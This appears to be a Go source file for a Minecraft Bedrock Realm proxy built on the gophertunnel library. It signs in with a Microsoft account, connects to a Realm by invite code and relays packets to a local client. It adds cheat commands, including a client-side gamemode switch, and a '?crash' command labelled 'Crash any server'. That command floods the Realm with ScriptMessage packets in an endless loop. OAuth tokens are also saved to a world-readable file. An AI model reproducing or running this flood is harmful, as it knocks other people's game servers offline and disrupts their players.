package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/uuid"
	"github.com/sandertv/gophertunnel/minecraft"
	"github.com/sandertv/gophertunnel/minecraft/auth"
	"github.com/sandertv/gophertunnel/minecraft/protocol"
	"github.com/sandertv/gophertunnel/minecraft/protocol/packet"
	"github.com/sandertv/gophertunnel/minecraft/realms"
	"github.com/sandertv/gophertunnel/minecraft/resource"
	"golang.org/x/oauth2"
)

const (
	DefaultCacheDir = "delorian/cache"
)

type Config struct {
	Connection struct {
		LocalAddress string `json:"local_address"`
	} `json:"connection"`
	Realm struct {
		Code string `json:"realm_code"`
	} `json:"realm"`
}

type RealmInfo struct {
	Address       string
	Name          string
	PlayersOnline int
	MaxPlayers    int
}

func readConfig() Config {
	c := Config{}
	configPath := "config.json"

	c.Connection.LocalAddress = "0.0.0.0:19132"
	c.Realm.Code = "ABCDEF"

	if _, err := os.Stat(configPath); os.IsNotExist(err) {
		file, createErr := os.Create(configPath)
		if createErr != nil {
			Errorf("ERROR #1 CONFIG, exit code 1 | failed to create %s: %v", configPath, createErr)
		}
		defer file.Close()

		encoder := json.NewEncoder(file)
		encoder.SetIndent("", "  ")
		if encodeErr := encoder.Encode(c); encodeErr != nil {
			Errorf("ERROR #2 CONFIG, exit code 1 | failed to write default configuration: %v", encodeErr)
		}
		Debug("default configuration created. edit the file and restart.")
		os.Exit(0)
	}

	file, err := os.Open(configPath)
	if err != nil {
		Errorf("ERROR #3 CONFIG, exit code 1 | access denied to %s: %v", configPath, err)
	}
	defer file.Close()

	if decodeErr := json.NewDecoder(file).Decode(&c); decodeErr != nil {
		Errorf("ERROR #4 CONFIG, exit code 1 | failed to decode %s. check JSON syntax: %v", configPath, decodeErr)
	}

	return c
}
func main() {
	files()
	if _, err := os.Stat("token.tok"); os.IsNotExist(err) {
		Info("authentication required, waiting for input")
	}
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	ctx := context.Background()

	c := readConfig()
	tokenSource := tokenSrc()
	Info("successfully authenticated for realms")

	realmInfo, err := getRealmAddress(ctx, tokenSource, c.Realm.Code)
	if err != nil {
		Errorf("ERROR #1 DIALER, exit code 1 | error obtaining realm address (code: %s): %v", c.Realm.Code, err)
	}
	var packs []*resource.Pack
	conn, err := minecraft.Dialer{TokenSource: tokenSource}.Dial("raknet", realmInfo.Address)
	if err != nil {
		Warnf("ERROR #2 DIALER, exit code none | error on locating resources packs: %v", err)
	} else {
		packs = conn.ResourcePacks()
		_ = conn.Close()
	}
	p, err := minecraft.NewForeignStatusProvider(realmInfo.Address)
	listener, err := minecraft.ListenConfig{
		StatusProvider: p,
		ResourcePacks:  packs,
	}.Listen("raknet", c.Connection.LocalAddress)
	Infof("REALM INFO:\nName: %s\nPlayers: %d/%d\nAddress: %s\nCode: %s",
		realmInfo.Name,
		realmInfo.PlayersOnline,
		realmInfo.MaxPlayers,
		realmInfo.Address,
		c.Realm.Code,
	)
	if err != nil {
		Errorf("ERROR #3 DIALER, exit code 1 | error on listening to the proxy %v", err)
	}
	Infof("proxy listening on %s.", c.Connection.LocalAddress)

	for {
		conn, err := listener.Accept()
		if err != nil {
			Errorf("ERROR #4 DIALER, exit code 1 | error accepting connection: %v", err)
			return
		}
		go handleConnection(conn, realmInfo.Address, tokenSource, listener, packs)
	}
}

func getRealmAddress(ctx context.Context, src oauth2.TokenSource, realmCode string) (RealmInfo, error) {
	c, cancel := context.WithTimeout(ctx, time.Second*15)
	defer cancel()

	client := realms.NewClient(src, http.DefaultClient)
	realm, err := client.Realm(c, realmCode)
	if err != nil {
		return RealmInfo{}, err
	}

	address, err := realm.Address(c)
	if err != nil {
		return RealmInfo{}, err
	}

	onlineCount := 0
	for _, player := range realm.Players {
		if player.Online {
			onlineCount++
		}
	}

	return RealmInfo{
		Address:       address,
		Name:          realm.Name,
		PlayersOnline: onlineCount,
		MaxPlayers:    realm.MaxPlayers,
	}, nil
}

func handleConnection(conn net.Conn, realmAddress string, src oauth2.TokenSource, listener *minecraft.Listener, serverPacks []*resource.Pack) {
	clientConn, ok := conn.(*minecraft.Conn)
	if !ok {
		conn.Close()
		return
	}
	ctx := context.Background()
	Infof("new client from %s. attemping to connect", clientConn.RemoteAddr())
	clientData := clientConn.ClientData()
	dial := minecraft.Dialer{
		IdentityData: clientConn.IdentityData(),
		ClientData:   clientData,
		TokenSource:  src,
	}
	dial.DownloadResourcePack = func(id uuid.UUID, version string, _, _ int) bool {
		name := fmt.Sprintf("%s_%s", id, version)
		path := filepath.Join(DefaultCacheDir, name+".mcpack")
		_, err := os.Stat(path)
		if err == nil {
			return false
		}
		if !os.IsNotExist(err) {
			Errorf("ERROR #5 DIALER, exit code 1 | error checking resource pack cache: %v", err) // Use helper
			return false
		}
		return true
	}
	for _, pack := range serverPacks {
		packData := make([]byte, pack.Len())
		_, err := pack.ReadAt(packData, 0)
		if err != nil {
			Errorf("ERROR #6 DIALER, exit code 1 | error reading resource pack data: %v", err)
			continue
		}

		name := fmt.Sprintf("%s_%s", pack.UUID(), pack.Version())
		packName := sanitizeFilename(pack.Name())
		downloadPath := filepath.Join(DefaultCacheDir, packName+".mcpack")
		cachePath := filepath.Join(DefaultCacheDir, name+".mcpack")

		_, err = os.Stat(downloadPath)
		if err == nil {

		} else if os.IsNotExist(err) {
		} else {
			Errorf("ERROR #7 DIALER, exit code 1 | error checking download path %v", err)
		}
		_, err = os.Stat(cachePath)
		if err == nil {
		} else if os.IsNotExist(err) {

			err = os.WriteFile(cachePath, packData, 0644)
			if err != nil {
				Errorf("ERROR #8 DIALER, exit code 1 | error writing resource pack to cache: %v", err)
			} else {
				Debugf("pack cached: %s", name)
			}
		} else {
			Errorf("ERROR #8 DIALER, exit code 1 | error checking cache path: %v", err)
		}
	}
	var gd = clientConn.GameData()
	serverConn, err := dial.DialContext(ctx, "raknet", realmAddress)
	if err != nil {
		Errorf("ERROR #9 DIALER, exit code 1 | could not connect to Realm for client %s: %v", clientConn.RemoteAddr(), err)
		clientConn.Close()
		return
	}
	var g sync.WaitGroup
	g.Add(2)
	go func() {
		if err := clientConn.StartGame(serverConn.GameData()); err != nil {
			Errorf("ERROR #10 DIALER, exit code 1 | error starting game: %v", err)
		}
		Info("Client connected successfully")
		clientConn.WritePacket(&packet.Text{
			Message:  "§bRealm Proxy",
			TextType: packet.TextTypeChat,
		})
		g.Done()
	}()
	go func() {
		if err := clientConn.DoSpawn(); err != nil {
			Errorf("ERROR #11 DIALER, exit code 1 | error spawning in the server: %v", err)
		}
		g.Done()
	}()
	g.Wait()
	go func() {
		defer listener.Disconnect(serverConn, "connection lost")
		defer serverConn.Close()
		for {
			pk, err := clientConn.ReadPacket()
			if err != nil {
				return
			}
			if err := serverConn.WritePacket(pk); err != nil {
				var disc minecraft.DisconnectError
				if ok := errors.As(err, &disc); ok {
					_ = listener.Disconnect(clientConn, disc.Error())
				}
				return
			}
			gamemode := protocol.Command{
				Name:        "?gamemode",
				Description: "§bSet in a gamemode",
				Overloads: []protocol.CommandOverload{
					{
						Parameters: []protocol.CommandParameter{
							{
								Name:     "gamemode",
								Type:     protocol.CommandArgTypeInt | protocol.CommandArgValid,
								Optional: false,
							},
						},
					},
				},
			}
			level := protocol.Command{
				Name:        "?level",
				Description: "§cManage current level.",
				Overloads: []protocol.CommandOverload{
					{
						Parameters: []protocol.CommandParameter{
							{
								Name:     "info",
								Type:     protocol.CommandArgTypeRawText | protocol.CommandArgValid,
								Optional: true,
							},
						},
					},
				},
			}
			spammer := protocol.Command{
				Name:        "?crash",
				Description: "§bCrash any server",
			}
			cmdPacket := &packet.AvailableCommands{
				Commands: []protocol.Command{gamemode, spammer, level},
			}

			_ = clientConn.WritePacket(cmdPacket)
			if cmd, ok := pk.(*packet.CommandRequest); ok {
				switch cmd.CommandLine {
				case "/?gamemode 0":
					clientConn.WritePacket(&packet.Text{Message: "§aSuccessfully changed your gamemode to§c Survival.", TextType: packet.TextTypeChat})
					clientConn.WritePacket(&packet.SetPlayerGameType{GameType: packet.GameTypeSurvival})
				case "/?gamemode 1":
					clientConn.WritePacket(&packet.Text{Message: "§aSuccessfully changed your gamemode to§c Creative.", TextType: packet.TextTypeChat})
					clientConn.WritePacket(&packet.SetPlayerGameType{GameType: packet.GameTypeCreative})
				case "/?gamemode 2":
					clientConn.WritePacket(&packet.Text{Message: "§aSuccessfully changed your gamemode to§c Adventure.", TextType: packet.TextTypeChat})
					clientConn.WritePacket(&packet.SetPlayerGameType{GameType: packet.GameTypeAdventure})
				case "/?gamemode 3":
					clientConn.WritePacket(&packet.Text{Message: "§aSuccessfully changed your gamemode to§c Spectator.", TextType: packet.TextTypeChat})
					clientConn.WritePacket(&packet.SetPlayerGameType{GameType: packet.GameTypeSpectator})
				case "/?level info":
					clientConn.WritePacket(&packet.Text{Message: fmt.Sprintf("dimension: %d | chunk radius: %d | name: %s | default gamemode: %d | spawn: %v | seed: %v",
						gd.Dimension, gd.ChunkRadius, gd.WorldName, gd.WorldGameMode, gd.WorldSpawn, gd.WorldSeed), TextType: packet.TextTypeChat})
				case "/?crash":
					go func() {
						for {
							serverConn.WritePacket(&packet.ScriptMessage{
								Identifier: "hi",
							})
						}
					}()
				}
			}
		}

	}()
	go func() {
		defer serverConn.Close()
		defer listener.Disconnect(serverConn, "connection lost")
		for {
			pk, err := serverConn.ReadPacket()
			if err != nil {
				var disc minecraft.DisconnectError
				if ok := errors.As(err, &disc); ok {
					_ = listener.Disconnect(clientConn, disc.Error())
				}
				return
			}
			if err := clientConn.WritePacket(pk); err != nil {
				return
			}
		}
	}()
}
func files() {
	dirs := []string{"delorian", "delorian/cache"}
	for _, dir := range dirs {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			if err := os.Mkdir(dir, 0755); err != nil {
				Errorf("ERROR #1 OS, exit code 1 | error creating directory %s: %v", dir, err)
			}
		}
	}
	readme := "delorian/readme.txt"
	readmeContent := "Version: 1.21.111 | Run this command on powershell: CheckNetIsolation LoopbackExempt -a -n='Microsoft.MinecraftUWP_8wekyb3d8bbwe'\n"
	if _, err := os.Stat(readme); os.IsNotExist(err) {
		if err := os.WriteFile(readme, []byte(readmeContent), 0644); err != nil {
			Errorf("ERROR #2 OS, exit code 1 | error writing file %s: , %v", readme, err)
		}
	}
}
func sanitizeFilename(filename string) string {
	re := regexp.MustCompile(`[<>:"/\\|?*]`)
	filename = re.ReplaceAllString(filename, "_")
	filename = strings.TrimSpace(filename)
	re = regexp.MustCompile(`\s+`)
	filename = re.ReplaceAllString(filename, "_")
	return filename
}

func tokenSrc() oauth2.TokenSource {
	check := func(err error) {
		if err != nil {
			Errorf("ERROR #1 AUTH, exit code 1 | error checking token: %v", err)
		}
	}
	token := new(oauth2.Token)
	tokenData, err := os.ReadFile("token.tok")
	if err == nil {
		_ = json.Unmarshal(tokenData, token)
	} else {
		token, err = auth.RequestLiveToken()
		check(err)
	}
	src := auth.RefreshTokenSource(token)
	_, err = src.Token() // Attempt to get a token to check if the refresh token is still valid.
	if err != nil {
		token, err = auth.RequestLiveToken()
		check(err)
		src = auth.RefreshTokenSource(token)
	}
	go func() {
		c := make(chan os.Signal, 3)
		signal.Notify(c, syscall.SIGTERM, syscall.SIGINT)
		<-c

		tok, _ := src.Token()
		b, _ := json.Marshal(tok)
		if err := os.WriteFile("token.tok", b, 0644); err != nil {
			Errorf("ERROR #3 OS, exit code 1 | failed to save token.tok: %v", err)
		}
		os.Exit(0)
	}()
	return src
}

type noopHandler struct{}

func (h *noopHandler) HandleClientPacket(pk packet.Packet, conn *minecraft.Conn) (handled bool) {
	return false
}
func (h *noopHandler) HandleServerPacket(pk packet.Packet, conn *minecraft.Conn) (handled bool) {
	return false
}
